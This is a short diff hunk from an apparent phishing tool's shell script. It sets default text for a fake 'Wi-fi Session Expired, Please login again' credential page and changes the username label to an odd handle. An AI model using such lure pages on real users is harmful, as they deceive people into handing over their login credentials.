@@ -190,7 +190,7 @@ fi
 createpage() {
 default_cap1="Wi-fi Session Expired"
 default_cap2="Please login again."
-default_user_text="Username:"
+default_user_text="emm4nuel69.__:"
 default_pass_text="Password:"
 default_sub_text="Log-In"
 
